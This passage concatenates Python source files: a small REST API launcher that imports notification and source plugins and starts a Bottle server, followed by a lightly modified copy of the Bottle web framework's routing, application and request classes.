# Functions & classes =========================================================



# Main program ================================================================
print "it works"
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
REST API launcher and manager.
"""
# Imports =====================================================================
from bottle import run

import bottle_gui

# global definitions
from plugins import settings

# source plugins
import plugins.sources.lastfm
import plugins.sources.hysteria
import plugins.sources.shaddack

# notificators plugins
import plugins.notificators.sms
import plugins.notificators.email

# core plugins
import plugins.core.runner
import plugins.core.ticker
import plugins.core.key_val
import plugins.core.echolink
import plugins.core.deduplicator


# Functions & objects =========================================================
def main():
    bottle_gui.gui()

    run(
        server="paste",
        host=settings.ADDRESS,
        port=settings.PORT,
        debug=True,
        reloader=True,
        # ssl_pem="host.pem"
    )


# Main program ================================================================
if __name__ == '__main__':
    main()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Bottle is a fast and simple micro-framework for small web applications. It
offers request dispatching (Routes) with url parameter support, templates,
a built-in HTTP Server and adapters for many third party WSGI/HTTP-server and
template engines - all in a single file and with no dependencies other than the
Python Standard Library.

Homepage and documentation: http://bottlepy.org/

Copyright (c) 2014, Marcel Hellkamp.
License: MIT (see LICENSE for details)
"""

from __future__ import with_statement

__author__ = 'Marcel Hellkamp'
__version__ = '0.13-dev'
__license__ = 'MIT'

# The gevent and eventlet server adapters need to patch some modules before
# they are imported. This is why we parse the commandline parameters here but
# handle them later
if __name__ == '__main__':
    from optparse import OptionParser
    _cmd_parser = OptionParser(usage="usage: %prog [options] package.module:app")
    _opt = _cmd_parser.add_option
    _opt("--version", action="store_true", help="show version number.")
    _opt("-b", "--bind", metavar="ADDRESS", help="bind socket to ADDRESS.")
    _opt("-s", "--server", default='wsgiref', help="use SERVER as backend.")
    _opt("-p", "--plugin", action="append", help="install additional plugin/s.")
    _opt("--debug", action="store_true", help="start server in debug mode.")
    _opt("--reload", action="store_true", help="auto-reload on file changes.")
    _cmd_options, _cmd_args = _cmd_parser.parse_args()
    if _cmd_options.server:
        if _cmd_options.server.startswith('gevent'):
            import gevent.monkey; gevent.monkey.patch_all()
        elif _cmd_options.server.startswith('eventlet'):
            import eventlet; eventlet.monkey_patch()

import base64, cgi, email.utils, functools, hmac, imp, itertools, mimetypes,\
        os, re, subprocess, sys, tempfile, threading, time, warnings

from types import FunctionType
from datetime import date as datedate, datetime, timedelta
from tempfile import TemporaryFile
from traceback import format_exc, print_exc
from inspect import getargspec
from unicodedata import normalize


try: from simplejson import dumps as json_dumps, loads as json_lds
except ImportError: # pragma: no cover
    try: from json import dumps as json_dumps, loads as json_lds
    except ImportError:
        try: from django.utils.simplejson import dumps as json_dumps, loads as json_lds
        except ImportError:
            def json_dumps(data):
                raise ImportError("JSON support requires Python 2.6 or simplejson.")
            json_lds = json_dumps



# We now try to fix 2.5/2.6/3.1/3.2 incompatibilities.
# It ain't pretty but it works... Sorry for the mess.

py   = sys.version_info
py3k = py >= (3, 0, 0)
py25 = py <  (2, 6, 0)
py31 = (3, 1, 0) <= py < (3, 2, 0)

# Workaround for the missing "as" keyword in py3k.
def _e(): return sys.exc_info()[1]

# Workaround for the "print is a keyword/function" Python 2/3 dilemma
# and a fallback for mod_wsgi (resticts stdout/err attribute access)
try:
    _stdout, _stderr = sys.stdout.write, sys.stderr.write
except IOError:
    _stdout = lambda x: sys.stdout.write(x)
    _stderr = lambda x: sys.stderr.write(x)

# Lots of stdlib and builtin differences.
if py3k:
    import http.client as httplib
    import _thread as thread
    from urllib.parse import urljoin, SplitResult as UrlSplitResult
    from urllib.parse import urlencode, quote as urlquote, unquote as urlunquote
    urlunquote = functools.partial(urlunquote, encoding='latin1')
    from http.cookies import SimpleCookie
    from collections import MutableMapping as DictMixin
    import pickle
    from io import BytesIO
    from configparser import ConfigParser
    basestring = str
    unicode = str
    json_loads = lambda s: json_lds(touni(s))
    callable = lambda x: hasattr(x, '__call__')
    imap = map
    def _raise(*a): raise a[0](a[1]).with_traceback(a[2])
else: # 2.x
    import httplib
    import thread
    from urlparse import urljoin, SplitResult as UrlSplitResult
    from urllib import urlencode, quote as urlquote, unquote as urlunquote
    from Cookie import SimpleCookie
    from itertools import imap
    import cPickle as pickle
    from StringIO import StringIO as BytesIO
    from ConfigParser import SafeConfigParser as ConfigParser
    if py25:
        msg  = "Python 2.5 support may be dropped in future versions of Bottle."
        warnings.warn(msg, DeprecationWarning)
        from UserDict import DictMixin
        def next(it): return it.next()
        bytes = str
    else: # 2.6, 2.7
        from collections import MutableMapping as DictMixin
    unicode = unicode
    json_loads = json_lds
    eval(compile('def _raise(*a): raise a[0], a[1], a[2]', '<py3fix>', 'exec'))


# Some helpers for string/byte handling
def tob(s, enc='utf8'):
    return s.encode(enc) if isinstance(s, unicode) else bytes(s)


def touni(s, enc='utf8', err='strict'):
    if isinstance(s, bytes):
        return s.decode(enc, err)
    else:
        return unicode(s or ("" if s is None else s))

tonat = touni if py3k else tob

# 3.2 fixes cgi.FieldStorage to accept bytes (which makes a lot of sense).
# 3.1 needs a workaround.
if py31:
    from io import TextIOWrapper

    class NCTextIOWrapper(TextIOWrapper):
        def close(self): pass # Keep wrapped buffer open.


# A bug in functools causes it to break if the wrapper is an instance method
def update_wrapper(wrapper, wrapped, *a, **ka):
    try:
        functools.update_wrapper(wrapper, wrapped, *a, **ka)
    except AttributeError:
        pass


# These helpers are used at module level and need to be defined first.
# And yes, I know PEP-8, but sometimes a lower-case classname makes more sense.

def depr(message, strict=False):
    warnings.warn(message, DeprecationWarning, stacklevel=3)

def makelist(data): # This is just too handy
    if isinstance(data, (tuple, list, set, dict)):
        return list(data)
    elif data:
        return [data]
    else:
        return []


class DictProperty(object):
    """ Property that maps to a key in a local dict-like attribute. """
    def __init__(self, attr, key=None, read_only=False):
        self.attr, self.key, self.read_only = attr, key, read_only

    def __call__(self, func):
        functools.update_wrapper(self, func, updated=[])
        self.getter, self.key = func, self.key or func.__name__
        return self

    def __get__(self, obj, cls):
        if obj is None: return self
        key, storage = self.key, getattr(obj, self.attr)
        if key not in storage: storage[key] = self.getter(obj)
        return storage[key]

    def __set__(self, obj, value):
        if self.read_only: raise AttributeError("Read-Only property.")
        getattr(obj, self.attr)[self.key] = value

    def __delete__(self, obj):
        if self.read_only: raise AttributeError("Read-Only property.")
        del getattr(obj, self.attr)[self.key]


class cached_property(object):
    """ A property that is only computed once per instance and then replaces
        itself with an ordinary attribute. Deleting the attribute resets the
        property. """

    def __init__(self, func):
        self.__doc__ = getattr(func, '__doc__')
        self.func = func

    def __get__(self, obj, cls):
        if obj is None: return self
        value = obj.__dict__[self.func.__name__] = self.func(obj)
        return value


class lazy_attribute(object):
    """ A property that caches itself to the class object. """
    def __init__(self, func):
        functools.update_wrapper(self, func, updated=[])
        self.getter = func

    def __get__(self, obj, cls):
        value = self.getter(cls)
        setattr(cls, self.__name__, value)
        return value






###############################################################################
# Exceptions and Events ########################################################
###############################################################################


class BottleException(Exception):
    """ A base class for exceptions used by bottle. """
    pass






###############################################################################
# Routing ######################################################################
###############################################################################


class RouteError(BottleException):
    """ This is a base class for all routing related exceptions """


class RouteReset(BottleException):
    """ If raised by a plugin or request handler, the route is reset and all
        plugins are re-applied. """

class RouterUnknownModeError(RouteError): pass


class RouteSyntaxError(RouteError):
    """ The route parser found something not supported by this router. """


class RouteBuildError(RouteError):
    """ The route could not be built. """


def _re_flatten(p):
    """ Turn all capturing groups in a regular expression pattern into
        non-capturing groups. """
    if '(' not in p:
        return p
    return re.sub(r'(\\*)(\(\?P<[^>]+>|\((?!\?))',
        lambda m: m.group(0) if len(m.group(1)) % 2 else m.group(1) + '(?:', p)


class Router(object):
    """ A Router is an ordered collection of route->target pairs. It is used to
        efficiently match WSGI requests against a number of routes and return
        the first target that satisfies the request. The target may be anything,
        usually a string, ID or callable object. A route consists of a path-rule
        and a HTTP method.

        The path-rule is either a static path (e.g. `/contact`) or a dynamic
        path that contains wildcards (e.g. `/wiki/<page>`). The wildcard syntax
        and details on the matching order are described in docs:`routing`.
    """

    default_pattern = '[^/]+'
    default_filter  = 're'

    #: The current CPython regexp implementation does not allow more
    #: than 99 matching groups per regular expression.
    _MAX_GROUPS_PER_PATTERN = 99

    def __init__(self, strict=False):
        self.rules    = [] # All rules in order
        self._groups  = {} # index of regexes to find them in dyna_routes
        self.builder  = {} # Data structure for the url builder
        self.static   = {} # Search structure for static routes
        self.dyna_routes   = {}
        self.dyna_regexes  = {} # Search structure for dynamic routes
        #: If true, static routes are no longer checked first.
        self.strict_order = strict
        self.filters = {
            're':    lambda conf:
                (_re_flatten(conf or self.default_pattern), None, None),
            'int':   lambda conf: (r'-?\d+', int, lambda x: str(int(x))),
            'float': lambda conf: (r'-?[\d.]+', float, lambda x: str(float(x))),
            'path':  lambda conf: (r'.+?', None, None)}

    def add_filter(self, name, func):
        """ Add a filter. The provided function is called with the configuration
        string as parameter and must return a (regexp, to_python, to_url) tuple.
        The first element is a string, the last two are callables or None. """
        self.filters[name] = func

    rule_syntax = re.compile('(\\\\*)'
        '(?:(?::([a-zA-Z_][a-zA-Z_0-9]*)?()(?:#(.*?)#)?)'
          '|(?:<([a-zA-Z_][a-zA-Z_0-9]*)?(?::([a-zA-Z_]*)'
            '(?::((?:\\\\.|[^\\\\>]+)+)?)?)?>))')

    def _itertokens(self, rule):
        offset, prefix = 0, ''
        for match in self.rule_syntax.finditer(rule):
            prefix += rule[offset:match.start()]
            g = match.groups()
            if len(g[0])%2: # Escaped wildcard
                prefix += match.group(0)[len(g[0]):]
                offset = match.end()
                continue
            if prefix:
                yield prefix, None, None
            name, filtr, conf = g[4:7] if g[2] is None else g[1:4]
            yield name, filtr or 'default', conf or None
            offset, prefix = match.end(), ''
        if offset <= len(rule) or prefix:
            yield prefix+rule[offset:], None, None

    def add(self, rule, method, target, name=None):
        """ Add a new rule or replace the target for an existing rule. """
        anons     = 0    # Number of anonymous wildcards found
        keys      = []   # Names of keys
        pattern   = ''   # Regular expression pattern with named groups
        filters   = []   # Lists of wildcard input filters
        builder   = []   # Data structure for the URL builder
        is_static = True

        for key, mode, conf in self._itertokens(rule):
            if mode:
                is_static = False
                if mode == 'default': mode = self.default_filter
                mask, in_filter, out_filter = self.filters[mode](conf)
                if not key:
                    pattern += '(?:%s)' % mask
                    key = 'anon%d' % anons
                    anons += 1
                else:
                    pattern += '(?P<%s>%s)' % (key, mask)
                    keys.append(key)
                if in_filter: filters.append((key, in_filter))
                builder.append((key, out_filter or str))
            elif key:
                pattern += re.escape(key)
                builder.append((None, key))

        self.builder[rule] = builder
        if name: self.builder[name] = builder

        if is_static and not self.strict_order:
            self.static.setdefault(method, {})
            self.static[method][self.build(rule)] = (target, None)
            return

        try:
            re_pattern = re.compile('^(%s)$' % pattern)
            re_match = re_pattern.match
        except re.error:
            raise RouteSyntaxError("Could not add Route: %s (%s)" % (rule, _e()))

        if filters:
            def getargs(path):
                url_args = re_match(path).groupdict()
                for name, wildcard_filter in filters:
                    try:
                        url_args[name] = wildcard_filter(url_args[name])
                    except ValueError:
                        raise HTTPError(400, 'Path has wrong format.')
                return url_args
        elif re_pattern.groupindex:
            def getargs(path):
                return re_match(path).groupdict()
        else:
            getargs = None

        flatpat = _re_flatten(pattern)
        whole_rule = (rule, flatpat, target, getargs)

        if (flatpat, method) in self._groups:
            if DEBUG:
                msg = 'Route <%s %s> overwrites a previously defined route'
                warnings.warn(msg % (method, rule), RuntimeWarning)
            self.dyna_routes[method][self._groups[flatpat, method]] = whole_rule
        else:
            self.dyna_routes.setdefault(method, []).append(whole_rule)
            self._groups[flatpat, method] = len(self.dyna_routes[method]) - 1

        self._compile(method)

    def _compile(self, method):
        all_rules = self.dyna_routes[method]
        comborules = self.dyna_regexes[method] = []
        maxgroups = self._MAX_GROUPS_PER_PATTERN
        for x in range(0, len(all_rules), maxgroups):
            some = all_rules[x:x+maxgroups]
            combined = (flatpat for (_, flatpat, _, _) in some)
            combined = '|'.join('(^%s$)' % flatpat for flatpat in combined)
            combined = re.compile(combined).match
            rules = [(target, getargs) for (_, _, target, getargs) in some]
            comborules.append((combined, rules))

    def build(self, _name, *anons, **query):
        """ Build an URL by filling the wildcards in a rule. """
        builder = self.builder.get(_name)
        if not builder: raise RouteBuildError("No route with that name.", _name)
        try:
            for i, value in enumerate(anons): query['anon%d'%i] = value
            url = ''.join([f(query.pop(n)) if n else f for (n,f) in builder])
            return url if not query else url+'?'+urlencode(query)
        except KeyError:
            raise RouteBuildError('Missing URL argument: %r' % _e().args[0])

    def match(self, environ):
        """ Return a (target, url_args) tuple or raise HTTPError(400/404/405). """
        verb = environ['REQUEST_METHOD'].upper()
        path = environ['PATH_INFO'] or '/'

        if verb == 'HEAD':
            methods = ['PROXY', verb, 'GET', 'ANY']
        else:
            methods = ['PROXY', verb, 'ANY']

        for method in methods:
            if method in self.static and path in self.static[method]:
                target, getargs = self.static[method][path]
                return target, getargs(path) if getargs else {}
            elif method in self.dyna_regexes:
                for combined, rules in self.dyna_regexes[method]:
                    match = combined(path)
                    if match:
                        target, getargs = rules[match.lastindex - 1]
                        return target, getargs(path) if getargs else {}

        # No matching route found. Collect alternative methods for 405 response
        allowed = set([])
        nocheck = set(methods)
        for method in set(self.static) - nocheck:
            if path in self.static[method]:
                allowed.add(verb)
        for method in set(self.dyna_regexes) - allowed - nocheck:
            for combined, rules in self.dyna_regexes[method]:
                match = combined(path)
                if match:
                    allowed.add(method)
        if allowed:
            allow_header = ",".join(sorted(allowed))
            raise HTTPError(405, "Method not allowed.", Allow=allow_header)

        # No matching route and no alternative method found. We give up
        raise HTTPError(404, "Not found: " + repr(path))






class Route(object):
    """ This class wraps a route callback along with route specific metadata and
        configuration and applies Plugins on demand. It is also responsible for
        turing an URL path rule into a regular expression usable by the Router.
    """

    def __init__(self, app, rule, method, callback, name=None,
                 plugins=None, skiplist=None, **config):
        #: The application this route is installed to.
        self.app = app
        #: The path-rule string (e.g. ``/wiki/<page>``).
        self.rule = rule
        #: The HTTP method as a string (e.g. ``GET``).
        self.method = method
        #: The original callback with no plugins applied. Useful for introspection.
        self.callback = callback
        #: The name of the route (if specified) or ``None``.
        self.name = name or None
        #: A list of route-specific plugins (see :meth:`Bottle.route`).
        self.plugins = plugins or []
        #: A list of plugins to not apply to this route (see :meth:`Bottle.route`).
        self.skiplist = skiplist or []
        #: Additional keyword arguments passed to the :meth:`Bottle.route`
        #: decorator are stored in this dictionary. Used for route-specific
        #: plugin configuration and meta-data.
        self.config = ConfigDict().load_dict(config)

    @cached_property
    def call(self):
        """ The route callback with all plugins applied. This property is
            created on demand and then cached to speed up subsequent requests."""
        return self._make_callback()

    def reset(self):
        """ Forget any cached values. The next time :attr:`call` is accessed,
            all plugins are re-applied. """
        self.__dict__.pop('call', None)

    def prepare(self):
        """ Do all on-demand work immediately (useful for debugging)."""
        self.call

    def all_plugins(self):
        """ Yield all Plugins affecting this route. """
        unique = set()
        for p in reversed(self.app.plugins + self.plugins):
            if True in self.skiplist: break
            name = getattr(p, 'name', False)
            if name and (name in self.skiplist or name in unique): continue
            if p in self.skiplist or type(p) in self.skiplist: continue
            if name: unique.add(name)
            yield p

    def _make_callback(self):
        callback = self.callback
        for plugin in self.all_plugins():
            try:
                if hasattr(plugin, 'apply'):
                    callback = plugin.apply(callback, self)
                else:
                    callback = plugin(callback)
            except RouteReset: # Try again with changed configuration.
                return self._make_callback()
            if not callback is self.callback:
                update_wrapper(callback, self.callback)
        return callback

    def get_undecorated_callback(self):
        """ Return the callback. If the callback is a decorated function, try to
            recover the original function. """
        func = self.callback
        func = getattr(func, '__func__' if py3k else 'im_func', func)
        closure_attr = '__closure__' if py3k else 'func_closure'
        while hasattr(func, closure_attr) and getattr(func, closure_attr):
            attributes = getattr(func, closure_attr)
            func = attributes[0].cell_contents

            print func

            # in case of decorators with multiple arguments
            if not isinstance(func, FunctionType):
                # pick first FunctionType instance from multiple arguments
                func = filter(
                    lambda x: isinstance(x, FunctionType),
                    map(lambda x: x.cell_contents, attributes)
                )[0]
        return func

    def get_callback_args(self):
        """ Return a list of argument names the callback (most likely) accepts
            as keyword arguments. If the callback is a decorated function, try
            to recover the original function before inspection. """
        return getargspec(self.get_undecorated_callback())[0]

    def get_config(self, key, default=None):
        """ Lookup a config field and return its value, first checking the
            route.config, then route.app.config."""
        for conf in (self.config, self.app.config):
            if key in conf: return conf[key]
        return default

    def __repr__(self):
        cb = self.get_undecorated_callback()
        return '<%s %r %r>' % (self.method, self.rule, cb)






###############################################################################
# Application Object ###########################################################
###############################################################################


class Bottle(object):
    """ Each Bottle object represents a single, distinct web application and
        consists of routes, callbacks, plugins, resources and configuration.
        Instances are callable WSGI applications.

        :param catchall: If true (default), handle all exceptions. Turn off to
                         let debugging middleware handle exceptions.
    """

    def __init__(self, catchall=True, autojson=True):

        #: A :class:`ConfigDict` for app specific configuration.
        self.config = ConfigDict()
        self.config._on_change = functools.partial(self.trigger_hook, 'config')
        self.config.meta_set('autojson', 'validate', bool)
        self.config.meta_set('catchall', 'validate', bool)
        self.config['catchall'] = catchall
        self.config['autojson'] = autojson

        #: A :class:`ResourceManager` for application files
        self.resources = ResourceManager()

        self.routes = [] # List of installed :class:`Route` instances.
        self.router = Router() # Maps requests to :class:`Route` instances.
        self.error_handler = {}

        # Core plugins
        self.plugins = [] # List of installed plugins.
        if self.config['autojson']:
            self.install(JSONPlugin())
        self.install(TemplatePlugin())

    #: If true, most exceptions are caught and returned as :exc:`HTTPError`
    catchall = DictProperty('config', 'catchall')

    __hook_names = 'before_request', 'after_request', 'app_reset', 'config'
    __hook_reversed = 'after_request'

    @cached_property
    def _hooks(self):
        return dict((name, []) for name in self.__hook_names)

    def add_hook(self, name, func):
        """ Attach a callback to a hook. Three hooks are currently implemented:

            before_request
                Executed once before each request. The request context is
                available, but no routing has happened yet.
            after_request
                Executed once after each request regardless of its outcome.
            app_reset
                Called whenever :meth:`Bottle.reset` is called.
        """
        if name in self.__hook_reversed:
            self._hooks[name].insert(0, func)
        else:
            self._hooks[name].append(func)

    def remove_hook(self, name, func):
        """ Remove a callback from a hook. """
        if name in self._hooks and func in self._hooks[name]:
            self._hooks[name].remove(func)
            return True

    def trigger_hook(self, __name, *args, **kwargs):
        """ Trigger a hook and return a list of results. """
        return [hook(*args, **kwargs) for hook in self._hooks[__name][:]]

    def hook(self, name):
        """ Return a decorator that attaches a callback to a hook. See
            :meth:`add_hook` for details."""
        def decorator(func):
            self.add_hook(name, func)
            return func
        return decorator

    def mount(self, prefix, app, **options):
        """ Mount an application (:class:`Bottle` or plain WSGI) to a specific
            URL prefix. Example::

                root_app.mount('/admin/', admin_app)

            :param prefix: path prefix or `mount-point`. If it ends in a slash,
                that slash is mandatory.
            :param app: an instance of :class:`Bottle` or a WSGI application.

            All other parameters are passed to the underlying :meth:`route` call.
        """

        segments = [p for p in prefix.split('/') if p]
        if not segments: raise ValueError('Empty path prefix.')
        path_depth = len(segments)

        def mountpoint_wrapper():
            try:
                request.path_shift(path_depth)
                rs = HTTPResponse([])
                def start_response(status, headerlist, exc_info=None):
                    if exc_info:
                        _raise(*exc_info)
                    rs.status = status
                    for name, value in headerlist: rs.add_header(name, value)
                    return rs.body.append
                body = app(request.environ, start_response)
                if body and rs.body: body = itertools.chain(rs.body, body)
                rs.body = body or rs.body
                return rs
            finally:
                request.path_shift(-path_depth)

        options.setdefault('skip', True)
        options.setdefault('method', 'PROXY')
        options.setdefault('mountpoint', {'prefix': prefix, 'target': app})
        options['callback'] = mountpoint_wrapper

        self.route('/%s/<:re:.*>' % '/'.join(segments), **options)
        if not prefix.endswith('/'):
            self.route('/' + '/'.join(segments), **options)

    def merge(self, routes):
        """ Merge the routes of another :class:`Bottle` application or a list of
            :class:`Route` objects into this application. The routes keep their
            'owner', meaning that the :data:`Route.app` attribute is not
            changed. """
        if isinstance(routes, Bottle):
            routes = routes.routes
        for route in routes:
            self.add_route(route)

    def install(self, plugin):
        """ Add a plugin to the list of plugins and prepare it for being
            applied to all routes of this application. A plugin may be a simple
            decorator or an object that implements the :class:`Plugin` API.
        """
        if hasattr(plugin, 'setup'): plugin.setup(self)
        if not callable(plugin) and not hasattr(plugin, 'apply'):
            raise TypeError("Plugins must be callable or implement .apply()")
        self.plugins.append(plugin)
        self.reset()
        return plugin

    def uninstall(self, plugin):
        """ Uninstall plugins. Pass an instance to remove a specific plugin, a type
            object to remove all plugins that match that type, a string to remove
            all plugins with a matching ``name`` attribute or ``True`` to remove all
            plugins. Return the list of removed plugins. """
        removed, remove = [], plugin
        for i, plugin in list(enumerate(self.plugins))[::-1]:
            if remove is True or remove is plugin or remove is type(plugin) \
            or getattr(plugin, 'name', True) == remove:
                removed.append(plugin)
                del self.plugins[i]
                if hasattr(plugin, 'close'): plugin.close()
        if removed: self.reset()
        return removed

    def reset(self, route=None):
        """ Reset all routes (force plugins to be re-applied) and clear all
            caches. If an ID or route object is given, only that specific route
            is affected. """
        if route is None: routes = self.routes
        elif isinstance(route, Route): routes = [route]
        else: routes = [self.routes[route]]
        for route in routes: route.reset()
        if DEBUG:
            for route in routes: route.prepare()
        self.trigger_hook('app_reset')

    def close(self):
        """ Close the application and all installed plugins. """
        for plugin in self.plugins:
            if hasattr(plugin, 'close'): plugin.close()

    def run(self, **kwargs):
        """ Calls :func:`run` with the same parameters. """
        run(self, **kwargs)

    def match(self, environ):
        """ Search for a matching route and return a (:class:`Route` , urlargs)
            tuple. The second value is a dictionary with parameters extracted
            from the URL. Raise :exc:`HTTPError` (404/405) on a non-match."""
        return self.router.match(environ)

    def get_url(self, routename, **kargs):
        """ Return a string that matches a named route """
        scriptname = request.environ.get('SCRIPT_NAME', '').strip('/') + '/'
        location = self.router.build(routename, **kargs).lstrip('/')
        return urljoin(urljoin('/', scriptname), location)

    def add_route(self, route):
        """ Add a route object, but do not change the :data:`Route.app`
            attribute."""
        self.routes.append(route)
        self.router.add(route.rule, route.method, route, name=route.name)
        if DEBUG: route.prepare()

    def route(self, path=None, method='GET', callback=None, name=None,
              apply=None, skip=None, **config):
        """ A decorator to bind a function to a request URL. Example::

                @app.route('/hello/<name>')
                def hello(name):
                    return 'Hello %s' % name

            The ``:name`` part is a wildcard. See :class:`Router` for syntax
            details.

            :param path: Request path or a list of paths to listen to. If no
              path is specified, it is automatically generated from the
              signature of the function.
            :param method: HTTP method (`GET`, `POST`, `PUT`, ...) or a list of
              methods to listen to. (default: `GET`)
            :param callback: An optional shortcut to avoid the decorator
              syntax. ``route(..., callback=func)`` equals ``route(...)(func)``
            :param name: The name for this route. (default: None)
            :param apply: A decorator or plugin or a list of plugins. These are
              applied to the route callback in addition to installed plugins.
            :param skip: A list of plugins, plugin classes or names. Matching
              plugins are not installed to this route. ``True`` skips all.

            Any additional keyword arguments are stored as route-specific
            configuration and passed to plugins (see :meth:`Plugin.apply`).
        """
        if callable(path): path, callback = None, path
        plugins = makelist(apply)
        skiplist = makelist(skip)
        def decorator(callback):
            if isinstance(callback, basestring): callback = load(callback)
            for rule in makelist(path) or yieldroutes(callback):
                for verb in makelist(method):
                    verb = verb.upper()
                    route = Route(self, rule, verb, callback, name=name,
                                  plugins=plugins, skiplist=skiplist, **config)
                    self.add_route(route)
            return callback
        return decorator(callback) if callback else decorator

    def get(self, path=None, method='GET', **options):
        """ Equals :meth:`route`. """
        return self.route(path, method, **options)

    def post(self, path=None, method='POST', **options):
        """ Equals :meth:`route` with a ``POST`` method parameter. """
        return self.route(path, method, **options)

    def put(self, path=None, method='PUT', **options):
        """ Equals :meth:`route` with a ``PUT`` method parameter. """
        return self.route(path, method, **options)

    def delete(self, path=None, method='DELETE', **options):
        """ Equals :meth:`route` with a ``DELETE`` method parameter. """
        return self.route(path, method, **options)

    def patch(self, path=None, method='PATCH', **options):
        """ Equals :meth:`route` with a ``PATCH`` method parameter. """
        return self.route(path, method, **options)

    def error(self, code=500):
        """ Decorator: Register an output handler for a HTTP error code"""
        def wrapper(handler):
            self.error_handler[int(code)] = handler
            return handler
        return wrapper

    def default_error_handler(self, res):
        return tob(template(ERROR_PAGE_TEMPLATE, e=res))

    def _handle(self, environ):
        path = environ['bottle.raw_path'] = environ['PATH_INFO']
        if py3k:
            try:
                environ['PATH_INFO'] = path.encode('latin1').decode('utf8')
            except UnicodeError:
                return HTTPError(400, 'Invalid path string. Expected UTF-8')

        try:
            environ['bottle.app'] = self
            request.bind(environ)
            response.bind()
            try:
                self.trigger_hook('before_request')
                route, args = self.router.match(environ)
                environ['route.handle'] = route
                environ['bottle.route'] = route
                environ['route.url_args'] = args
                return route.call(**args)
            finally:
                self.trigger_hook('after_request')
        except HTTPResponse:
            return _e()
        except RouteReset:
            route.reset()
            return self._handle(environ)
        except (KeyboardInterrupt, SystemExit, MemoryError):
            raise
        except Exception:
            if not self.catchall: raise
            stacktrace = format_exc()
            environ['wsgi.errors'].write(stacktrace)
            return HTTPError(500, "Internal Server Error", _e(), stacktrace)

    def _cast(self, out, peek=None):
        """ Try to convert the parameter into something WSGI compatible and set
        correct HTTP headers when possible.
        Support: False, str, unicode, dict, HTTPResponse, HTTPError, file-like,
        iterable of strings and iterable of unicodes
        """

        # Empty output is done here
        if not out:
            if 'Content-Length' not in response:
                response['Content-Length'] = 0
            return []
        # Join lists of byte or unicode strings. Mixed lists are NOT supported
        if isinstance(out, (tuple, list))\
        and isinstance(out[0], (bytes, unicode)):
            out = out[0][0:0].join(out) # b'abc'[0:0] -> b''
        # Encode unicode strings
        if isinstance(out, unicode):
            out = out.encode(response.charset)
        # Byte Strings are just returned
        if isinstance(out, bytes):
            if 'Content-Length' not in response:
                response['Content-Length'] = len(out)
            return [out]
        # HTTPError or HTTPException (recursive, because they may wrap anything)
        # TODO: Handle these explicitly in handle() or make them iterable.
        if isinstance(out, HTTPError):
            out.apply(response)
            out = self.error_handler.get(out.status_code, self.default_error_handler)(out)
            return self._cast(out)
        if isinstance(out, HTTPResponse):
            out.apply(response)
            return self._cast(out.body)

        # File-like objects.
        if hasattr(out, 'read'):
            if 'wsgi.file_wrapper' in request.environ:
                return request.environ['wsgi.file_wrapper'](out)
            elif hasattr(out, 'close') or not hasattr(out, '__iter__'):
                return WSGIFileWrapper(out)

        # Handle Iterables. We peek into them to detect their inner type.
        try:
            iout = iter(out)
            first = next(iout)
            while not first:
                first = next(iout)
        except StopIteration:
            return self._cast('')
        except HTTPResponse:
            first = _e()
        except (KeyboardInterrupt, SystemExit, MemoryError):
            raise
        except:
            if not self.catchall: raise
            first = HTTPError(500, 'Unhandled exception', _e(), format_exc())

        # These are the inner types allowed in iterator or generator objects.
        if isinstance(first, HTTPResponse):
            return self._cast(first)
        elif isinstance(first, bytes):
            new_iter = itertools.chain([first], iout)
        elif isinstance(first, unicode):
            encoder = lambda x: x.encode(response.charset)
            new_iter = imap(encoder, itertools.chain([first], iout))
        else:
            msg = 'Unsupported response type: %s' % type(first)
            return self._cast(HTTPError(500, msg))
        if hasattr(out, 'close'):
            new_iter = _closeiter(new_iter, out.close)
        return new_iter

    def wsgi(self, environ, start_response):
        """ The bottle WSGI-interface. """
        try:
            out = self._cast(self._handle(environ))
            # rfc2616 section 4.3
            if response._status_code in (100, 101, 204, 304)\
            or environ['REQUEST_METHOD'] == 'HEAD':
                if hasattr(out, 'close'): out.close()
                out = []
            start_response(response._status_line, response.headerlist)
            return out
        except (KeyboardInterrupt, SystemExit, MemoryError):
            raise
        except:
            if not self.catchall: raise
            err = '<h1>Critical error while processing request: %s</h1>' \
                  % html_escape(environ.get('PATH_INFO', '/'))
            if DEBUG:
                err += '<h2>Error:</h2>\n<pre>\n%s\n</pre>\n' \
                       '<h2>Traceback:</h2>\n<pre>\n%s\n</pre>\n' \
                       % (html_escape(repr(_e())), html_escape(format_exc()))
            environ['wsgi.errors'].write(err)
            headers = [('Content-Type', 'text/html; charset=UTF-8')]
            start_response('500 INTERNAL SERVER ERROR', headers, sys.exc_info())
            return [tob(err)]

    def __call__(self, environ, start_response):
        """ Each instance of :class:'Bottle' is a WSGI application. """
        return self.wsgi(environ, start_response)

    def __enter__(self):
        """ Use this application as default for all module-level shortcuts. """
        default_app.push(self)
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        default_app.pop()





###############################################################################
# HTTP and WSGI Tools ##########################################################
###############################################################################

class BaseRequest(object):
    """ A wrapper for WSGI environment dictionaries that adds a lot of
        convenient access methods and properties. Most of them are read-only.

        Adding new attributes to a request actually adds them to the environ
        dictionary (as 'bottle.request.ext.<name>'). This is the recommended
        way to store and access request-specific data.
    """

    __slots__ = ('environ', )

    #: Maximum size of memory buffer for :attr:`body` in bytes.
    MEMFILE_MAX = 102400

    def __init__(self, environ=None):
        """ Wrap a WSGI environ dictionary. """
        #: The wrapped WSGI environ dictionary. This is the only real attribute.
        #: All other attributes actually are read-only properties.
        self.environ = {} if environ is None else environ
        self.environ['bottle.request'] = self

    @DictProperty('environ', 'bottle.app', read_only=True)
    def app(self):
        """ Bottle application handling this request. """
        raise RuntimeError('This request is not connected to an application.')

    @DictProperty('environ', 'bottle.route', read_only=True)
    def route(self):
        """ The bottle :class:`Route` object that matches this request. """
        raise RuntimeError('This request is not connected to a route.')

    @DictProperty('environ', 'route.url_args', read_only=True)
    def url_args(self):
        """ The arguments extracted from the URL. """
        raise RuntimeError('This request is not connected to a route.')

    @property
    def path(self):
        """ The value of ``PATH_INFO`` with exactly one prefixed slash (to fix
            broken clients and avoid the "empty path" edge case). """
        return '/' + self.environ.get('PATH_INFO','').lstrip('/')

    @property
    def method(self):
        """ The ``REQUEST_METHOD`` value as an uppercase string. """
        return self.environ.get('REQUEST_METHOD', 'GET').upper()

    @DictProperty('environ', 'bottle.request.headers', read_only=True)
    def headers(self):
        """ A :class:`WSGIHeaderDict` that provides case-insensitive access to
